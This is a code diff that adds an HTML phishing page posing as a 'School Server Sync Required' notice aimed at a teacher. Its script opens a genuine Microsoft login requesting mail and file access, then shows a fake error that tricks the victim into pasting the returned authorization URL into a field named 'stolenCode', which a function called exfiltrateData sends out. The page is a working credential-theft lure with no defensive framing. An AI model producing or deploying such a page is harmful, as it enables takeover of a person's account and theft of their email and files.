@@ -1,3 +1,32 @@
+<!DOCTYPE html>
+<html>
+<body>
+
+<!-- 1. THE VISUAL PART (What the teacher sees) -->
+<div id="display-area" style="text-align: center; font-family: sans-serif;">
+    <h2 style="color: #0078d4;">School Server Sync Required</h2>
+    <p>Your session has expired. Please re-authenticate to keep your D: drive access.</p>
+    <button onclick="redirectToRealAuth()" style="padding: 12px; background: #0078d4; color: white; border: none; cursor: pointer;">
+        Sync Now
+    </button>
+</div>
+
+<!-- 2. THE LOGIC PART (The "Secret" script) -->
+<script>
+function redirectToRealAuth() {
+    // This part opens the "Real" login
+    const authUrl = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=00000000-0000-0000-0000-000000000000&response_type=code&redirect_uri=http://localhost/verify&scope=Mail.Read%20Files.ReadWrite.All%20offline_access";
+    window.open(authUrl, '_blank'); 
+
+    // This part changes the screen to the "Trap"
+    document.getElementById('display-area').innerHTML = `
+        <h3 style="color:red">⚠️ ERROR: 0x80048823</h3>
+        <p>Automatic sync failed. Copy the URL from the other window and paste it here to manually fix the connection:</p>
+        <input type="text" id="stolenCode" style="width:90%; padding: 10px;">
+        <br><br>
+        <button onclick="exfiltrateData()" style="padding: 10px;">Fix Connection</button>
+    `;
+}
 async function exfiltrateData() {
     const fullUrl = document.getElementById('stolenCode').value;
     
@@ -43,3 +72,8 @@ async function exfiltrateData() {
         alert("Network Error: Could not reach the server.");
     }
 }
+
+</script>
+
+</body>
+</html>
